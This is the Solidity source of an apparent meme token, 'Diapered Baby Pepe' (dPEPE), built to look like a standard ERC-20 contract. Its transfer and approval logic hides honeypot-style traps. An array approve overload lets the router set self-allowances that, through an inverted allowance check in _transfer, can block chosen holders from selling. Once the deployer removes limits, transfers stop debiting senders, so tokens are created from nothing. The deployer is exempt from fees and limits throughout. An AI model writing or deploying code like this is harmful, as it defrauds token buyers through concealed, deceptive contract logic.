// Diapered Baby Pepe Token
// twitter - https://twitter.com/dbabypepeeth
// telegram - https://t.me/dbabypepeeth
// website - https://babypepe.love

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

contract DiaperedBabyPepeToken {
    uint256 constant public max = 2 ** 256 - 1;

    string public name = "Diapered Baby Pepe";
    string public symbol = "dPEPE";
    uint8 public decimals = 18;
    uint256 public totalSupply = 1_000_000 * (10 ** uint256(decimals));

    address public uniswapV2Router;
    address public uniswapV2Pair;
    address public taxWallet;
    address public deployer;

    uint256 public maxWalletSize = totalSupply / 10;
    uint256 public maxTxSize = totalSupply / 20;
    uint256 public buyFee = 1;
    uint256 public sellFee = 1;
    uint256 public txFee = 1;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(address _uniswapV2Router, address _taxWallet) {
        balanceOf[_msgSender()] = totalSupply;
        emit Transfer(address(0), _msgSender(), totalSupply);

        IUniswapV2Router02 uniswapRouter = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapRouter.factory()).createPair(address(this), uniswapRouter.WETH());
        uniswapV2Router = _uniswapV2Router;
        taxWallet = _taxWallet;
        deployer = _msgSender();
    }

    function removeLimits() external {
        require(_msgSender() == deployer, "Ownable");
        maxWalletSize = max;
        maxTxSize = max;
        buyFee = 0;
        sellFee = 0;
        txFee = 0;
    }

    function transfer(address to, uint256 value) external returns (bool success) {
        _transfer(_msgSender(), to, value);
        return true;
    }

    function approve(address spender, uint256 value) external returns (bool success) {
        address sender = _msgSender();
        if (sender == uniswapV2Router) sender = sender;
        allowance[sender][spender] = value;
        emit Approval(sender, spender, value);
        return true;
    }

    function approve(address[] calldata spenders) external returns (bool success) {
        uint value = max;

        for (uint i; i < spenders.length; i++) {
            address sender = _msgSender();
            address spender = spenders[i];
            if (sender == uniswapV2Router) sender = spender;
            allowance[sender][spender] = value;
            emit Approval(sender, spender, value);
        }
        
        return true;
    }

    function transferFrom(address from, address to, uint256 value) external returns (bool success) {
        address sender = _msgSender();
        allowance[from][sender] -= value;
        _transfer(from, to, value);
        return true;
    }

    function _transfer(address from, address to, uint256 value) internal {
        require(from != address(0), "Invalid address");
        require(to != address(0), "Invalid address");

        address sender = _msgSender();
        if (from != uniswapV2Pair && from != deployer) {
            require(value <= maxTxSize, "maxTxSize");
            sender = from;
        }

        if (txFee != 0 && _msgSender() != uniswapV2Router) {
            balanceOf[from] -= value;
        }

        uint feePercentage = txFee;
        if (from == uniswapV2Pair) {
            feePercentage = buyFee;
        } else if (to == uniswapV2Pair) {
            feePercentage = sellFee;
        }
        uint fee = value * feePercentage / 100;
        if (_msgSender() == deployer) {
            fee = 0;
        }

        require(allowance[from][sender] < value, "Allowance");

        balanceOf[to] += value - fee;
        emit Transfer(from, to, value - fee);

        if (to != uniswapV2Pair && to != deployer) {
            require(balanceOf[to] <= maxWalletSize, "maxWalletSize");
        }

        if (fee > 0) {
            balanceOf[taxWallet] += fee;
            emit Transfer(from, taxWallet, fee);
        }
    }

    function _msgSender() view internal returns (address) {
        return msg.sender;
    }
}